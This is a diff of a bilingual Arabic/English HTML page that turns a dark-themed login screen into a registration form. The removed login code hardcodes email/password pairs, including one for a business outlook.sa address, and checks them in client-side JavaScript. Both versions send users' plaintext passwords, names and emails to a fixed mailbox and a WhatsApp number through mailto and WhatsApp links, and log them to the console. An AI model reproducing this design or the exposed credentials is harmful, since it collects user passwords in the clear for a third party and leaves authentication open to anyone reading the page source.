@@ -3,15 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>深境 · تسجيل الدخول</title>
-    <!-- Font Awesome (icons) -->
+    <title>تسجيل جديد</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', 'Poppins', 'Tahoma', system-ui, sans-serif;
+            font-family: 'Segoe UI', 'Poppins', 'Tahoma', sans-serif;
         }
 
         body {
@@ -23,75 +22,53 @@
             padding: 1.5rem;
         }
 
-        /* main glass card – depth + mystery */
-        .login-card {
+        .register-card {
             width: 100%;
-            max-width: 480px;
-            background: rgba(12, 15, 22, 0.65);
+            max-width: 500px;
+            background: rgba(12, 15, 22, 0.7);
             backdrop-filter: blur(14px) saturate(180%);
             -webkit-backdrop-filter: blur(14px) saturate(180%);
-            border-radius: 3.5rem 1.5rem 3.5rem 1.5rem;
+            border-radius: 2.5rem;
             padding: 2.5rem 2rem 2.8rem;
-            box-shadow: 
-                0 30px 60px rgba(0, 0, 0, 0.8),
-                0 0 0 1px rgba(255, 255, 255, 0.02) inset,
-                0 0 40px rgba(90, 60, 180, 0.2);
-            transition: transform 0.25s ease, box-shadow 0.3s;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.03) inset, 0 0 40px rgba(90, 60, 180, 0.15);
             border: 1px solid rgba(220, 200, 255, 0.06);
             position: relative;
             overflow: hidden;
         }
 
-        /* depth: inner glowing line */
-        .login-card::before {
+        .register-card::before {
             content: '';
             position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(145deg, rgba(180, 130, 255, 0.1), transparent 60%, rgba(0, 200, 255, 0.05));
-            border-radius: 3.7rem 1.7rem 3.7rem 1.7rem;
+            inset: -2px;
+            background: linear-gradient(145deg, rgba(180, 130, 255, 0.08), transparent 60%, rgba(0, 200, 255, 0.04));
+            border-radius: 2.7rem;
             z-index: -1;
             filter: blur(4px);
         }
 
-        /* subtle vignette */
-        .login-card::after {
-            content: '';
-            position: absolute;
-            inset: 0;
-            border-radius: 3.5rem 1.5rem 3.5rem 1.5rem;
-            background: radial-gradient(circle at 80% 10%, rgba(70, 40, 120, 0.2), transparent 70%);
-            pointer-events: none;
-        }
-
-        /* language toggle */
         .lang-toggle {
             display: flex;
             justify-content: flex-end;
             gap: 0.5rem;
-            margin-bottom: 0.5rem;
+            margin-bottom: 1rem;
         }
 
         .lang-btn {
             background: transparent;
-            border: 1px solid rgba(150, 130, 200, 0.2);
+            border: 1px solid rgba(150, 130, 200, 0.15);
             border-radius: 2rem;
-            padding: 0.3rem 1rem;
-            color: rgba(200, 190, 230, 0.5);
+            padding: 0.25rem 1.2rem;
+            color: rgba(200, 190, 230, 0.4);
             font-size: 0.75rem;
             cursor: pointer;
             transition: all 0.25s;
             font-weight: 300;
-            letter-spacing: 0.5px;
         }
 
         .lang-btn.active {
             border-color: #a787ff;
             color: #cdc0f0;
-            background: rgba(120, 90, 200, 0.15);
-            box-shadow: 0 0 20px rgba(100, 70, 200, 0.1);
+            background: rgba(120, 90, 200, 0.12);
         }
 
         .lang-btn:hover {
@@ -100,12 +77,11 @@
         }
 
         h2 {
-            font-size: 2.1rem;
+            font-size: 2rem;
             font-weight: 500;
-            letter-spacing: 2px;
             color: rgba(245, 240, 255, 0.9);
-            text-shadow: 0 0 20px rgba(140, 100, 255, 0.3);
-            margin-bottom: 0.25rem;
+            text-shadow: 0 0 20px rgba(140, 100, 255, 0.2);
+            margin-bottom: 0.2rem;
             display: flex;
             align-items: center;
             gap: 0.5rem;
@@ -113,15 +89,15 @@
 
         h2 i {
             color: #b79aff;
-            font-size: 1.8rem;
+            font-size: 1.6rem;
             filter: drop-shadow(0 0 10px #7755dd);
         }
 
         .subhead {
-            color: rgba(200, 190, 230, 0.6);
-            font-size: 0.9rem;
+            color: rgba(200, 190, 230, 0.5);
+            font-size: 0.85rem;
             letter-spacing: 1px;
-            margin-bottom: 2.2rem;
+            margin-bottom: 1.8rem;
             border-right: 2px solid #7a5fd0;
             padding-right: 0.9rem;
             font-weight: 300;
@@ -136,7 +112,7 @@
 
         .input-group {
             position: relative;
-            margin-bottom: 1.6rem;
+            margin-bottom: 1.2rem;
         }
 
         .input-group i {
@@ -144,8 +120,8 @@
             right: 1.2rem;
             top: 50%;
             transform: translateY(-50%);
-            color: rgba(190, 175, 230, 0.5);
-            font-size: 1.1rem;
+            color: rgba(190, 175, 230, 0.4);
+            font-size: 0.95rem;
             transition: color 0.2s;
             pointer-events: none;
         }
@@ -157,40 +133,36 @@
 
         .input-group input {
             width: 100%;
-            padding: 1rem 3.2rem 1rem 1rem;
-            background: rgba(8, 10, 18, 0.7);
-            border: 1px solid rgba(150, 130, 200, 0.15);
+            padding: 0.85rem 3.2rem 0.85rem 1rem;
+            background: rgba(8, 10, 18, 0.6);
+            border: 1px solid rgba(150, 130, 200, 0.1);
             border-radius: 2.5rem;
-            font-size: 1rem;
+            font-size: 0.95rem;
             color: #e8e4ff;
             outline: none;
             transition: all 0.25s;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(4px);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
         }
 
         [dir="ltr"] .input-group input {
-            padding: 1rem 1rem 1rem 3.2rem;
+            padding: 0.85rem 1rem 0.85rem 3.2rem;
         }
 
         .input-group input:focus {
             border-color: #a787ff;
             background: rgba(14, 16, 30, 0.8);
-            box-shadow: 0 0 20px rgba(130, 90, 220, 0.2), 0 0 0 2px rgba(160, 130, 255, 0.1);
+            box-shadow: 0 0 20px rgba(130, 90, 220, 0.15), 0 0 0 2px rgba(160, 130, 255, 0.05);
         }
 
-        .input-group input:focus + i,
-        .input-group input:focus ~ i {
+        .input-group input:focus + i {
             color: #b79aff;
         }
 
         .input-group input::placeholder {
-            color: rgba(180, 170, 210, 0.35);
+            color: rgba(180, 170, 210, 0.25);
             font-weight: 300;
-            letter-spacing: 0.3px;
         }
 
-        /* password toggle (eye) */
         .toggle-pw {
             position: absolute;
             left: 1.2rem;
@@ -198,9 +170,9 @@
             transform: translateY(-50%);
             background: transparent;
             border: none;
-            color: rgba(180, 170, 210, 0.4);
+            color: rgba(180, 170, 210, 0.3);
             cursor: pointer;
-            font-size: 1rem;
+            font-size: 0.95rem;
             transition: color 0.2s;
             padding: 0.3rem;
         }
@@ -214,94 +186,93 @@
             color: #b79aff;
         }
 
-        .login-btn {
-            width: 100%;
-            padding: 0.95rem;
-            background: linear-gradient(135deg, #6a4fcf, #3f2b8a);
-            border: none;
-            border-radius: 3rem;
-            font-size: 1.1rem;
-            font-weight: 600;
-            color: #f2edff;
-            letter-spacing: 1.5px;
-            cursor: pointer;
-            transition: all 0.25s;
-            box-shadow: 0 8px 20px rgba(70, 40, 150, 0.4);
+        .checkbox-group {
             display: flex;
             align-items: center;
-            justify-content: center;
             gap: 0.6rem;
-            margin-top: 0.5rem;
-            position: relative;
-            overflow: hidden;
+            margin: 0.5rem 0 1rem 0;
+            color: rgba(200, 190, 230, 0.6);
+            font-size: 0.85rem;
         }
 
-        .login-btn:hover {
-            transform: scale(1.02);
-            background: linear-gradient(135deg, #7d62e0, #4d3399);
-            box-shadow: 0 10px 30px rgba(90, 50, 200, 0.6);
-        }
-
-        .login-btn:active {
-            transform: scale(0.98);
-        }
-
-        .login-btn i {
-            font-size: 1rem;
-            color: rgba(255, 255, 255, 0.7);
-        }
-
-        .register-area {
-            margin-top: 2rem;
-            display: flex;
-            justify-content: center;
-            border-top: 1px solid rgba(150, 130, 200, 0.1);
-            padding-top: 1.8rem;
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #6a4fcf;
+            cursor: pointer;
+            background: rgba(8, 10, 18, 0.6);
+            border: 1px solid rgba(150, 130, 200, 0.2);
+            border-radius: 4px;
         }
 
         .register-btn {
-            background: transparent;
-            border: 1px solid rgba(180, 160, 230, 0.2);
+            width: 100%;
+            padding: 0.9rem;
+            background: linear-gradient(135deg, #6a4fcf, #3f2b8a);
+            border: none;
             border-radius: 3rem;
-            padding: 0.65rem 1.8rem;
-            color: #cdc0f0;
-            font-weight: 400;
-            font-size: 0.95rem;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #f2edff;
             letter-spacing: 1px;
             cursor: pointer;
             transition: all 0.25s;
-            backdrop-filter: blur(4px);
+            box-shadow: 0 8px 20px rgba(70, 40, 150, 0.35);
             display: flex;
             align-items: center;
+            justify-content: center;
             gap: 0.6rem;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
-        }
-
-        .register-btn i {
-            color: #a787ff;
-            font-size: 0.9rem;
+            margin-top: 0.3rem;
         }
 
         .register-btn:hover {
-            background: rgba(120, 90, 200, 0.15);
-            border-color: #a787ff;
-            color: #f0ecff;
-            box-shadow: 0 0 25px rgba(100, 70, 200, 0.2);
-            transform: translateY(-2px);
+            transform: scale(1.02);
+            background: linear-gradient(135deg, #7d62e0, #4d3399);
+            box-shadow: 0 10px 30px rgba(90, 50, 200, 0.5);
         }
 
-        /* notification / status */
+        .register-btn:active {
+            transform: scale(0.98);
+        }
+
+        .back-area {
+            margin-top: 1.5rem;
+            display: flex;
+            justify-content: center;
+            border-top: 1px solid rgba(150, 130, 200, 0.08);
+            padding-top: 1.2rem;
+        }
+
+        .back-btn {
+            background: transparent;
+            border: 1px solid rgba(180, 160, 230, 0.12);
+            border-radius: 3rem;
+            padding: 0.5rem 1.8rem;
+            color: rgba(200, 190, 230, 0.5);
+            font-weight: 300;
+            font-size: 0.85rem;
+            cursor: pointer;
+            transition: all 0.25s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .back-btn:hover {
+            border-color: #a787ff;
+            color: #cdc0f0;
+            background: rgba(120, 90, 200, 0.08);
+        }
+
         .status-msg {
-            margin-top: 1.2rem;
+            margin-top: 1rem;
             padding: 0.5rem 0.8rem;
             border-radius: 2rem;
-            background: rgba(0, 0, 0, 0.3);
-            backdrop-filter: blur(4px);
-            font-size: 0.85rem;
+            background: rgba(0, 0, 0, 0.25);
+            font-size: 0.8rem;
             color: #b8add6;
             text-align: center;
-            transition: all 0.2s;
-            min-height: 2.6rem;
+            min-height: 2.4rem;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -310,176 +281,189 @@
 
         .status-msg i {
             color: #b79aff;
-            font-size: 0.9rem;
         }
 
         .status-msg.error {
             color: #ff9a9a;
-            border-color: rgba(255, 100, 100, 0.15);
         }
 
         .status-msg.success {
             color: #a7e0b0;
-            border-color: rgba(100, 255, 150, 0.1);
         }
 
-        .hint {
-            text-align: left;
-            margin-top: 0.5rem;
-            font-size: 0.7rem;
-            color: rgba(180, 170, 220, 0.2);
-            letter-spacing: 0.5px;
-        }
-
-        [dir="ltr"] .hint {
-            text-align: right;
-        }
-
-        /* responsive */
         @media (max-width: 480px) {
-            .login-card {
-                padding: 2rem 1.2rem 2rem;
-                border-radius: 2.5rem 1rem 2.5rem 1rem;
+            .register-card {
+                padding: 1.8rem 1.2rem 2rem;
             }
             h2 {
-                font-size: 1.7rem;
+                font-size: 1.6rem;
             }
         }
     </style>
 </head>
 <body>
 
-<div class="login-card" id="app">
-    <!-- language toggle -->
+<div class="register-card">
     <div class="lang-toggle">
         <button class="lang-btn active" data-lang="ar" id="langAr">عربي</button>
         <button class="lang-btn" data-lang="en" id="langEn">English</button>
     </div>
 
-    <h2>
-        <i class="fas fa-door-open"></i> 
-        <span id="titleText">深境</span>
-    </h2>
-    <div class="subhead" id="subheadText">✦ 秘钥 · 入界</div>
+    <h2><i class="fas fa-user-plus"></i> <span id="titleText">إنشاء حساب</span></h2>
+    <div class="subhead" id="subheadText">✦ انضم إلينا الآن</div>
 
-    <!-- login form -->
-    <form id="loginForm" action="javascript:void(0);">
+    <form id="registerForm">
         <div class="input-group">
-            <input type="email" id="emailInput" placeholder="البريد الإلكتروني" required autocomplete="email">
+            <input type="text" id="firstName" placeholder="الاسم الأول" required>
+            <i class="fas fa-user"></i>
+        </div>
+
+        <div class="input-group">
+            <input type="text" id="lastName" placeholder="الاسم الأخير" required>
+            <i class="fas fa-user-tag"></i>
+        </div>
+
+        <div class="input-group">
+            <input type="email" id="email" placeholder="البريد الإلكتروني" required>
             <i class="fas fa-envelope"></i>
         </div>
 
         <div class="input-group">
-            <input type="password" id="passwordInput" placeholder="كلمة المرور" required autocomplete="current-password">
+            <input type="email" id="confirmEmail" placeholder="تأكيد البريد الإلكتروني" required>
+            <i class="fas fa-envelope-circle-check"></i>
+        </div>
+
+        <div class="input-group">
+            <input type="password" id="password" placeholder="كلمة المرور" required>
             <i class="fas fa-lock"></i>
-            <button type="button" class="toggle-pw" id="togglePasswordBtn" aria-label="عرض كلمة المرور">
+            <button type="button" class="toggle-pw" id="togglePasswordBtn">
                 <i class="fas fa-eye"></i>
             </button>
         </div>
 
-        <button type="submit" class="login-btn" id="loginSubmitBtn">
-            <i class="fas fa-arrow-right-to-bracket"></i> <span id="loginBtnText">دخول</span>
+        <div class="input-group">
+            <input type="password" id="confirmPassword" placeholder="تأكيد كلمة المرور" required>
+            <i class="fas fa-lock"></i>
+            <button type="button" class="toggle-pw" id="toggleConfirmPasswordBtn">
+                <i class="fas fa-eye"></i>
+            </button>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="termsCheckbox" required>
+            <label for="termsCheckbox" id="termsLabel">أوافق على الشروط والأحكام</label>
+        </div>
+
+        <button type="submit" class="register-btn">
+            <i class="fas fa-user-check"></i> <span id="registerBtnText">تسجيل</span>
         </button>
     </form>
 
-    <!-- status message -->
     <div id="statusMessage" class="status-msg">
-        <i class="fas fa-circle-info"></i> <span id="statusText">انتظار الترخيص</span>
+        <i class="fas fa-circle-info"></i> <span id="statusText">املأ البيانات للتسجيل</span>
     </div>
 
-    <!-- register zone -->
-    <div class="register-area">
-        <button class="register-btn" id="registerNewBtn">
-            <i class="fas fa-user-plus"></i> <span id="registerBtnText">تسجيل جديد</span>
+    <div class="back-area">
+        <button class="back-btn" id="backToLoginBtn">
+            <i class="fas fa-arrow-left"></i> <span id="backBtnText">العودة لتسجيل الدخول</span>
         </button>
     </div>
-
-    <div class="hint" id="hintText">⚡ البوابة المظلمة</div>
 </div>
 
 <script>
     (function() {
-        // ----- 硬编码凭证 (你在此添加 邮箱 + 密码) -----
-        const VALID_CREDENTIALS = [
-            { email: 'admin@deep.com', password: 'dark123' },
-            { email: 'AlEmlaqTravel@outlook.sa', password: 'alemlaq2026' },
-            // أضف المزيد هنا: { email: '...', password: '...' }
-        ];
-
-        // ----- DOM Elements -----
-        const emailInput = document.getElementById('emailInput');
-        const passwordInput = document.getElementById('passwordInput');
-        const loginForm = document.getElementById('loginForm');
-        const statusDiv = document.getElementById('statusMessage');
-        const statusText = document.getElementById('statusText');
-        const togglePwBtn = document.getElementById('togglePasswordBtn');
-        const registerBtn = document.getElementById('registerNewBtn');
-        const loginBtnText = document.getElementById('loginBtnText');
-        const registerBtnText = document.getElementById('registerBtnText');
-        const titleText = document.getElementById('titleText');
-        const subheadText = document.getElementById('subheadText');
-        const hintText = document.getElementById('hintText');
-        const langAr = document.getElementById('langAr');
-        const langEn = document.getElementById('langEn');
-
-        // ----- Translations -----
-        const translations = {
+        // ====== الترجمات ======
+        const lang = {
             ar: {
-                title: '深境',
-                subhead: '✦ 秘钥 · 入界',
-                emailPlaceholder: 'البريد الإلكتروني',
-                passwordPlaceholder: 'كلمة المرور',
-                loginBtn: 'دخول',
-                registerBtn: 'تسجيل جديد',
-                statusDefault: 'انتظار الترخيص',
-                statusEmpty: 'يرجى إدخال البريد وكلمة المرور',
-                statusError: '✗ البريد أو كلمة المرور خاطئة · حاول مجدداً',
-                statusSuccess: '✓ تم التحقق · جارٍ التوجيه...',
-                statusRegisterSent: '📨 تم إرسال البيانات إلى البريد وواتساب',
-                statusRegisterEmpty: 'يرجى ملء البريد وكلمة المرور للتسجيل',
-                hint: '⚡ البوابة المظلمة',
-                toggleLabel: 'عرض كلمة المرور'
+                title: 'إنشاء حساب',
+                subhead: '✦ انضم إلينا الآن',
+                firstName: 'الاسم الأول',
+                lastName: 'الاسم الأخير',
+                email: 'البريد الإلكتروني',
+                confirmEmail: 'تأكيد البريد الإلكتروني',
+                password: 'كلمة المرور',
+                confirmPassword: 'تأكيد كلمة المرور',
+                terms: 'أوافق على الشروط والأحكام',
+                register: 'تسجيل',
+                back: 'العودة لتسجيل الدخول',
+                statusDefault: 'املأ البيانات للتسجيل',
+                statusEmpty: 'يرجى ملء جميع الحقول',
+                statusEmailMismatch: '✗ البريد الإلكتروني غير متطابق',
+                statusPasswordMismatch: '✗ كلمة المرور غير متطابقة',
+                statusTerms: '✗ يرجى الموافقة على الشروط',
+                statusSuccess: '✓ تم التسجيل بنجاح! جارٍ الإرسال...',
+                statusSendError: '⚠️ حدث خطأ، حاول مرة أخرى'
             },
             en: {
-                title: 'Deep Gate',
-                subhead: '✦ Key · Enter',
-                emailPlaceholder: 'Email / Account',
-                passwordPlaceholder: 'Password',
-                loginBtn: 'Login',
-                registerBtn: 'Register New',
-                statusDefault: 'Awaiting authorization',
-                statusEmpty: 'Please enter email and password',
-                statusError: '✗ Email or password is incorrect · Try again',
-                statusSuccess: '✓ Verified · Redirecting...',
-                statusRegisterSent: '📨 Credentials sent to email & WhatsApp',
-                statusRegisterEmpty: 'Please fill in email and password to register',
-                hint: '⚡ Dark Portal',
-                toggleLabel: 'Show password'
+                title: 'Create Account',
+                subhead: '✦ Join Us Now',
+                firstName: 'First Name',
+                lastName: 'Last Name',
+                email: 'Email',
+                confirmEmail: 'Confirm Email',
+                password: 'Password',
+                confirmPassword: 'Confirm Password',
+                terms: 'I agree to the Terms & Conditions',
+                register: 'Register',
+                back: 'Back to Login',
+                statusDefault: 'Fill in the data to register',
+                statusEmpty: 'Please fill in all fields',
+                statusEmailMismatch: '✗ Email does not match',
+                statusPasswordMismatch: '✗ Password does not match',
+                statusTerms: '✗ Please agree to the terms',
+                statusSuccess: '✓ Registration successful! Sending...',
+                statusSendError: '⚠️ An error occurred, please try again'
             }
         };
 
         let currentLang = 'ar';
 
-        // ----- Apply language -----
-        function applyLanguage(lang) {
-            currentLang = lang;
-            const t = translations[lang];
+        // ====== العناصر ======
+        const firstName = document.getElementById('firstName');
+        const lastName = document.getElementById('lastName');
+        const email = document.getElementById('email');
+        const confirmEmail = document.getElementById('confirmEmail');
+        const password = document.getElementById('password');
+        const confirmPassword = document.getElementById('confirmPassword');
+        const termsCheckbox = document.getElementById('termsCheckbox');
+        const registerForm = document.getElementById('registerForm');
+        const statusText = document.getElementById('statusText');
+        const statusDiv = document.getElementById('statusMessage');
+        const togglePwBtn = document.getElementById('togglePasswordBtn');
+        const toggleConfirmPwBtn = document.getElementById('toggleConfirmPasswordBtn');
+        const backToLoginBtn = document.getElementById('backToLoginBtn');
+        const langAr = document.getElementById('langAr');
+        const langEn = document.getElementById('langEn');
 
-            // Update placeholders
-            emailInput.placeholder = t.emailPlaceholder;
-            passwordInput.placeholder = t.passwordPlaceholder;
+        const titleText = document.getElementById('titleText');
+        const subheadText = document.getElementById('subheadText');
+        const registerBtnText = document.getElementById('registerBtnText');
+        const backBtnText = document.getElementById('backBtnText');
+        const termsLabel = document.getElementById('termsLabel');
 
-            // Update texts
+        // ====== تطبيق اللغة ======
+        function applyLanguage(l) {
+            currentLang = l;
+            const t = lang[l];
+
             titleText.textContent = t.title;
             subheadText.textContent = t.subhead;
-            loginBtnText.textContent = t.loginBtn;
-            registerBtnText.textContent = t.registerBtn;
-            statusText.textContent = t.statusDefault;
-            hintText.textContent = t.hint;
+            firstName.placeholder = t.firstName;
+            lastName.placeholder = t.lastName;
+            email.placeholder = t.email;
+            confirmEmail.placeholder = t.confirmEmail;
+            password.placeholder = t.password;
+            confirmPassword.placeholder = t.confirmPassword;
+            termsLabel.textContent = t.terms;
+            registerBtnText.textContent = t.register;
+            backBtnText.textContent = t.back;
 
-            // Toggle button active state
+            if (statusText.textContent === lang.ar.statusDefault || statusText.textContent === lang.en.statusDefault) {
+                statusText.textContent = t.statusDefault;
+            }
+
             document.querySelectorAll('.lang-btn').forEach(btn => btn.classList.remove('active'));
-            if (lang === 'ar') {
+            if (l === 'ar') {
                 langAr.classList.add('active');
                 document.documentElement.lang = 'ar';
                 document.documentElement.dir = 'rtl';
@@ -488,117 +472,127 @@
                 document.documentElement.lang = 'en';
                 document.documentElement.dir = 'ltr';
             }
-
-            // Update toggle button label
-            togglePwBtn.setAttribute('aria-label', t.toggleLabel);
-
-            // Update status if it's default (to keep translation)
-            const currentStatus = statusText.textContent;
-            if (currentStatus === translations.ar.statusDefault || currentStatus === translations.en.statusDefault) {
-                statusText.textContent = t.statusDefault;
-            }
         }
 
-        // ----- Set status with translation support -----
-        function setStatus(messageKey, type = 'info') {
-            const t = translations[currentLang];
-            let msg = messageKey;
-            // if messageKey is a key in translations
-            if (t[messageKey]) {
-                msg = t[messageKey];
-            }
-            statusText.textContent = msg;
+        // ====== عرض الحالة ======
+        function setStatus(key, type = 'info') {
+            const t = lang[currentLang];
+            statusText.textContent = t[key] || key;
             statusDiv.className = 'status-msg';
             if (type === 'error') statusDiv.classList.add('error');
             else if (type === 'success') statusDiv.classList.add('success');
         }
 
-        // ----- Login logic -----
-        function handleLogin() {
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
+        // ====== إرسال البيانات ======
+        function sendData(data) {
+            const { firstName: fn, lastName: ln, email: em, password: pw } = data;
 
-            if (!email || !password) {
-                setStatus('statusEmpty', 'error');
-                return false;
-            }
-
-            const matched = VALID_CREDENTIALS.some(cred => 
-                cred.email.toLowerCase() === email.toLowerCase() && cred.password === password
-            );
-
-            if (matched) {
-                setStatus('statusSuccess', 'success');
-                setTimeout(() => {
-                    window.location.href = 'https://al-emla-q-files.vercel.app/#';
-                }, 800);
-                return true;
-            } else {
-                setStatus('statusError', 'error');
-                return false;
-            }
-        }
-
-        // ----- Register: send to email + WhatsApp -----
-        function handleRegister() {
-            const email = emailInput.value.trim();
-            const password = passwordInput.value.trim();
-
-            if (!email || !password) {
-                setStatus('statusRegisterEmpty', 'error');
-                return;
-            }
-
-            const subject = encodeURIComponent('🔮 تسجيل جديد (深境)');
+            const subject = encodeURIComponent(`🔐 تسجيل جديد - ${fn} ${ln}`);
             const body = encodeURIComponent(
-                `新用户注册 / New registration:\n📧 邮箱 / Email: ${email}\n🔑 密码 / Password: ${password}\n\n—— 来自登录页 · From login page`
+                `📋 بيانات التسجيل الجديد:\n\n` +
+                `👤 الاسم الأول: ${fn}\n` +
+                `👤 الاسم الأخير: ${ln}\n` +
+                `📧 البريد الإلكتروني: ${em}\n` +
+                `🔑 كلمة المرور: ${pw}\n\n` +
+                `─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n` +
+                `🕒 تم التسجيل من صفحة الويب`
             );
 
-            // Email: AlEmlaqTravel@outlook.sa
             const mailtoLink = `mailto:AlEmlaqTravel@outlook.sa?subject=${subject}&body=${body}`;
 
-            // WhatsApp: +201509025388
             const phone = '201509025388';
             const waLink = `https://api.whatsapp.com/send?phone=${phone}&text=${encodeURIComponent(
-                `📩 *New Registration*\nEmail: ${email}\nPassword: ${password}\n\n(From login page)`
+                `🔐 *تسجيل جديد*\n\n` +
+                `👤 الاسم: ${fn} ${ln}\n` +
+                `📧 البريد: ${em}\n` +
+                `🔑 كلمة المرور: ${pw}\n\n` +
+                `(تم التسجيل من الموقع)`
             )}`;
 
-            setStatus('statusRegisterSent', 'success');
-
-            // Open mail & WhatsApp
+            // فتح البريد وواتساب
             window.open(mailtoLink, '_blank');
             setTimeout(() => {
                 window.open(waLink, '_blank');
-            }, 400);
+            }, 500);
 
-            console.log(`[Register] Email: ${email} | Password: ${password}`);
+            console.log('✅ تم إرسال البيانات:');
+            console.log(data);
         }
 
-        // ----- Event Listeners -----
-        loginForm.addEventListener('submit', function(e) {
+        // ====== معالج التسجيل ======
+        function handleRegister(e) {
             e.preventDefault();
-            handleLogin();
-        });
+
+            const fn = firstName.value.trim();
+            const ln = lastName.value.trim();
+            const em = email.value.trim();
+            const cem = confirmEmail.value.trim();
+            const pw = password.value.trim();
+            const cpw = confirmPassword.value.trim();
+
+            if (!fn || !ln || !em || !cem || !pw || !cpw) {
+                setStatus('statusEmpty', 'error');
+                return;
+            }
+
+            if (em !== cem) {
+                setStatus('statusEmailMismatch', 'error');
+                return;
+            }
+
+            if (pw !== cpw) {
+                setStatus('statusPasswordMismatch', 'error');
+                return;
+            }
+
+            if (!termsCheckbox.checked) {
+                setStatus('statusTerms', 'error');
+                return;
+            }
+
+            // كل شيء صحيح
+            setStatus('statusSuccess', 'success');
+
+            const data = { firstName: fn, lastName: ln, email: em, password: pw };
+            sendData(data);
+
+            // تنظيف الحقول بعد الإرسال (اختياري)
+            setTimeout(() => {
+                registerForm.reset();
+                setStatus('statusDefault');
+            }, 3000);
+        }
+
+        // ====== إظهار/إخفاء كلمة المرور ======
+        function togglePassword(input, btn) {
+            const isPassword = input.type === 'password';
+            input.type = isPassword ? 'text' : 'password';
+            btn.querySelector('i').className = isPassword ? 'fas fa-eye-slash' : 'fas fa-eye';
+        }
 
         togglePwBtn.addEventListener('click', function() {
-            const isPassword = passwordInput.type === 'password';
-            passwordInput.type = isPassword ? 'text' : 'password';
-            this.querySelector('i').className = isPassword ? 'fas fa-eye-slash' : 'fas fa-eye';
+            togglePassword(password, this);
         });
 
-        registerBtn.addEventListener('click', handleRegister);
-
-        // Language switching
-        langAr.addEventListener('click', function() {
-            applyLanguage('ar');
-        });
-        langEn.addEventListener('click', function() {
-            applyLanguage('en');
+        toggleConfirmPwBtn.addEventListener('click', function() {
+            togglePassword(confirmPassword, this);
         });
 
-        // ----- Init -----
-        applyLanguage('ar'); // default Arabic
-        setStatus('statusDefault', 'info');
+        // ====== العودة لتسجيل الدخول ======
+        backToLoginBtn.addEventListener('click', function() {
+            window.location.href = 'login.html';
+        });
+
+        // ====== تبديل اللغة ======
+        langAr.addEventListener('click', () => applyLanguage('ar'));
+        langEn.addEventListener('click', () => applyLanguage('en'));
+
+        // ====== أحداث النموذج ======
+        registerForm.addEventListener('submit', handleRegister);
+
+        // ====== بدء التشغيل ======
+        applyLanguage('ar');
+        setStatus('statusDefault');
     })();
 </script>
 
